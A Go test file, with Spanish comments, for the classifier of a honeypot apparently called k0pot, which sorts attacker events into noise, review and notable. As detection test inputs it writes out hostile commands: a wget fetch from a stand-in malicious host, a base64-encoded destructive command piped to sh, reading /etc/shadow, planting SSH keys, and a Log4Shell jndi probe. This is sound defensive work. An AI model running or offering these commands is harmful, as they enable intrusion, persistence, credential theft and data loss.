package classify

import (
	"strings"
	"testing"

	"github.com/k0braintheworld/k0pot/internal/model"
)

func evento(tipo model.TipoEvento, detalle map[string]string) *model.Evento {
	return &model.Evento{Tipo: tipo, IP: "1.2.3.4", Detalle: detalle}
}

func origenLimpio() model.Origen {
	return model.Origen{IP: "1.2.3.4", Pais: "US", ISP: "Ejemplo",
		Reputacion: 0, Enriquecido: true}
}

// El caso mayoritario: bots probando contrasenas. Tiene que quedar como
// ruido, porque si esto alarma, honey alarma siempre y deja de servir.
func TestLoginFallidoEsRuidoDeFondo(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		evento(model.LoginFallido, map[string]string{"usuario": "root", "password": "123456"}),
		origenLimpio())
	if r.Clasificacion != model.RuidoFondo {
		t.Errorf("clasificacion = %q, esperaba ruido_fondo (motivo: %s)",
			r.Clasificacion, r.Motivo)
	}
	if r.Motivo == "" {
		t.Error("hasta el ruido debe venir explicado")
	}
}

func TestConexionSuletaEsRuidoDeFondo(t *testing.T) {
	c := Nuevo()
	if r := c.Clasificar(evento(model.Conexion, nil), origenLimpio()); r.Clasificacion != model.RuidoFondo {
		t.Errorf("clasificacion = %q", r.Clasificacion)
	}
}

// La linea que de verdad importa: ejecutar comandos significa que ya no
// es alguien llamando a la puerta.
func TestEjecutarComandosEsNotable(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		evento(model.ComandoEjecutado, map[string]string{"comando": "ls -la"}),
		origenLimpio())
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable", r.Clasificacion)
	}
}

func TestDescargaDeFicheroEsNotable(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(evento(model.DescargaFichero, nil), origenLimpio())
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable", r.Clasificacion)
	}
}

func TestLoginExitosoEsRevisar(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(evento(model.LoginExitoso, nil), origenLimpio())
	if r.Clasificacion != model.Revisar {
		t.Errorf("clasificacion = %q, esperaba revisar", r.Clasificacion)
	}
}

// El motivo se publica tal cual en los informes: tiene que decir que
// pretendia el atacante, no que cadena de texto encajo.
func TestComandosMaliciososSeExplicanEnCristiano(t *testing.T) {
	casos := []struct {
		comando string
		espera  string
	}{
		{"wget http://malo.example/bot.sh", "traerse programas"},
		{"chmod +x /tmp/bot", "permisos de ejecucion"},
		{"./xmrig -o stratum+tcp://pool:3333", "minar criptomonedas"},
		{"history -c", "borrar sus huellas"},
		{"echo cm0gLXJm | base64 -d | sh", "texto codificado"},
		{"cat /etc/shadow", "fichero de contrasenas"},
		{"echo 'ssh-rsa AAAA' >> ~/.ssh/authorized_keys", "volver a entrar"},
	}

	c := Nuevo()
	for _, caso := range casos {
		r := c.Clasificar(
			evento(model.ComandoEjecutado, map[string]string{"comando": caso.comando}),
			origenLimpio())
		if r.Clasificacion != model.Notable {
			t.Errorf("%q: clasificacion = %q", caso.comando, r.Clasificacion)
		}
		if !strings.Contains(r.Motivo, caso.espera) {
			t.Errorf("%q: motivo = %q, esperaba que mencionara %q",
				caso.comando, r.Motivo, caso.espera)
		}
	}
}

func TestPatronesNoDistinguenMayusculas(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		evento(model.ComandoEjecutado, map[string]string{"comando": "WGET http://malo.example/x"}),
		origenLimpio())
	if !strings.Contains(r.Motivo, "traerse programas") {
		t.Errorf("motivo = %q", r.Motivo)
	}
}

func TestTorEsRevisar(t *testing.T) {
	o := origenLimpio()
	o.Tor = true
	c := Nuevo()
	r := c.Clasificar(evento(model.LoginFallido, nil), o)
	if r.Clasificacion != model.Revisar {
		t.Errorf("clasificacion = %q, esperaba revisar", r.Clasificacion)
	}
	if !strings.Contains(r.Motivo, "Tor") {
		t.Errorf("motivo = %q", r.Motivo)
	}
}

func TestMalaReputacionEsRevisar(t *testing.T) {
	o := origenLimpio()
	o.Reputacion = 100
	o.TotalReportes = 543
	c := Nuevo()
	r := c.Clasificar(evento(model.LoginFallido, nil), o)
	if r.Clasificacion != model.Revisar {
		t.Errorf("clasificacion = %q, esperaba revisar", r.Clasificacion)
	}
	if !strings.Contains(r.Motivo, "543") {
		t.Errorf("motivo = %q, esperaba que citara las denuncias", r.Motivo)
	}
}

func TestReputacionBajoElUmbralSigueSiendoRuido(t *testing.T) {
	o := origenLimpio()
	o.Reputacion = 74 // justo por debajo del umbral de 75
	c := Nuevo()
	if r := c.Clasificar(evento(model.LoginFallido, nil), o); r.Clasificacion != model.RuidoFondo {
		t.Errorf("clasificacion = %q, esperaba ruido_fondo", r.Clasificacion)
	}
}

func TestUmbralesAjustables(t *testing.T) {
	o := origenLimpio()
	o.Reputacion = 50

	c := Nuevo()
	if r := c.Clasificar(evento(model.LoginFallido, nil), o); r.Clasificacion != model.RuidoFondo {
		t.Fatalf("con el umbral por defecto deberia ser ruido, fue %q", r.Clasificacion)
	}

	c.Umbrales.ReputacionAlta = 40
	if r := c.Clasificar(evento(model.LoginFallido, nil), o); r.Clasificacion != model.Revisar {
		t.Errorf("bajando el umbral deberia pasar a revisar, fue %q", r.Clasificacion)
	}
}

// Lo que el atacante hace manda sobre quien es: una IP impecable que
// ejecuta comandos sigue siendo notable.
func TestLaAccionPesaMasQueLaReputacion(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		evento(model.ComandoEjecutado, map[string]string{"comando": "wget http://x/y"}),
		origenLimpio())
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable pese a la IP limpia", r.Clasificacion)
	}
}

// El enriquecimiento es asincrono: hay que poder clasificar sin el y
// volver a hacerlo cuando llegue.
func TestClasificaSinContextoDeIP(t *testing.T) {
	c := Nuevo()
	sinEnriquecer := model.Origen{IP: "1.2.3.4"}

	if r := c.Clasificar(evento(model.LoginFallido, nil), sinEnriquecer); r.Clasificacion != model.RuidoFondo {
		t.Errorf("clasificacion = %q", r.Clasificacion)
	}
	// La accion se detecta igual, no depende del contexto de la IP.
	r := c.Clasificar(evento(model.DescargaFichero, nil), sinEnriquecer)
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable sin necesitar la IP", r.Clasificacion)
	}
}

func eventoProto(tipo model.TipoEvento, protocolo string, detalle map[string]string) *model.Evento {
	return &model.Evento{Tipo: tipo, Protocolo: protocolo, IP: "1.2.3.4", Detalle: detalle}
}

// Un PING de Redis no es nadie dentro del sistema. Tratarlo como notable
// llenaria la lista de alertas de ruido y taparia lo que si importa, que es
// justo lo que este proyecto intenta evitar.
func TestComandoDeProtocoloNoEsNotable(t *testing.T) {
	c := Nuevo()
	for _, caso := range []struct{ proto, comando string }{
		{"redis", "PING"},
		{"redis", "INFO"},
		{"redis", "GET clave"},
		{"ftp", "LIST"},
	} {
		r := c.Clasificar(
			eventoProto(model.ComandoEjecutado, caso.proto, map[string]string{"comando": caso.comando}),
			origenLimpio())
		if r.Clasificacion != model.RuidoFondo {
			t.Errorf("%s %q: clasificacion = %q, esperaba ruido_fondo",
				caso.proto, caso.comando, r.Clasificacion)
		}
	}
}

// Pero un comando de protocolo con mala intencion si lo es: escribir una
// clave SSH por Redis es el ataque clasico contra un Redis abierto.
func TestComandoDeProtocoloMaliciosoSiEsNotable(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		eventoProto(model.ComandoEjecutado, "redis",
			map[string]string{"comando": `SET x "ssh-rsa AAAAB3Nza"`}),
		origenLimpio())
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable", r.Clasificacion)
	}
	if !strings.Contains(r.Motivo, "volver a entrar") {
		t.Errorf("motivo = %q", r.Motivo)
	}
}

// Por SSH si significa tener shell.
func TestComandoPorShellSigueSiendoNotable(t *testing.T) {
	c := Nuevo()
	r := c.Clasificar(
		eventoProto(model.ComandoEjecutado, "ssh", map[string]string{"comando": "ls -la"}),
		origenLimpio())
	if r.Clasificacion != model.Notable {
		t.Errorf("clasificacion = %q, esperaba notable", r.Clasificacion)
	}
}

// El escaneo web de fondo es ruido; buscar ficheros concretos, no.
func TestPeticionesHTTP(t *testing.T) {
	c := Nuevo()
	casos := []struct {
		ruta     string
		esperada model.Clasificacion
		mencion  string
	}{
		{"/", model.RuidoFondo, ""},
		{"/favicon.ico", model.RuidoFondo, ""},
		{"/.env", model.Revisar, "configuracion"},
		{"/wp-admin/setup-config.php", model.Revisar, "paneles de administracion"},
		{"/?x=${jndi:ldap://malo/a}", model.Revisar, "vulnerabilidades conocidas"},
		{"/.ssh/id_rsa", model.Revisar, "credenciales"},
	}
	for _, caso := range casos {
		r := c.Clasificar(
			eventoProto(model.PeticionHTTP, "http", map[string]string{"ruta": caso.ruta}),
			origenLimpio())
		if r.Clasificacion != caso.esperada {
			t.Errorf("%q: clasificacion = %q, esperaba %q", caso.ruta, r.Clasificacion, caso.esperada)
		}
		if caso.mencion != "" && !strings.Contains(r.Motivo, caso.mencion) {
			t.Errorf("%q: motivo = %q, esperaba que mencionara %q", caso.ruta, r.Motivo, caso.mencion)
		}
	}
}

// Ante un protocolo desconocido se alerta, no se calla: un servicio nuevo
// que se olvide de rellenar el campo no debe convertir sus comandos en
// invisibles.
func TestProtocoloDesconocidoAlerta(t *testing.T) {
	c := Nuevo()
	for _, proto := range []string{"", "protocolo-nuevo", "mqtt"} {
		r := c.Clasificar(
			eventoProto(model.ComandoEjecutado, proto, map[string]string{"comando": "algo"}),
			origenLimpio())
		if r.Clasificacion != model.Notable {
			t.Errorf("protocolo %q: clasificacion = %q, esperaba notable", proto, r.Clasificacion)
		}
	}
}
